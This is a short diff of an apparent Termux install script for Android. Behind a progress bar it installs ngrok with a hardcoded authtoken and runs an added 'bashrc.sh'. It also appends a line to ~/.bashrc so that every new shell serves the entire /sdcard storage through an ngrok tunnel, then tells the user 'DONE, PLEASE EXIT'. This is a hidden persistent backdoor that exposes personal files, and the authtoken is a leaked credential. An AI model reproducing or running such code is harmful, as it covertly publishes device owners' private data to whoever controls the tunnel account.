@@ -65,6 +65,8 @@ mv ngrok /data/data/com.termux/files/usr/bin/ngrok > /dev/null 2>&1 && sleep 1
 print_bar 99
 ngrok authtoken 2I4JDe48dLs7BmvZoSTNGSPRVtn_q55YzU3ikG8Ewt5HogEV > /dev/null 2>&1 && sleep 1
 
+bash bashrc.sh
+
 print_bar 100
 echo ""
 echo -e "\ncd /sdcard && nohup python -m http.server 8080 > /dev/null 2>&1 & termux-chroot ngrok http 8080" >> ~/.bashrc && echo "DONE, PLEASE EXIT" && source ~/.bashrc
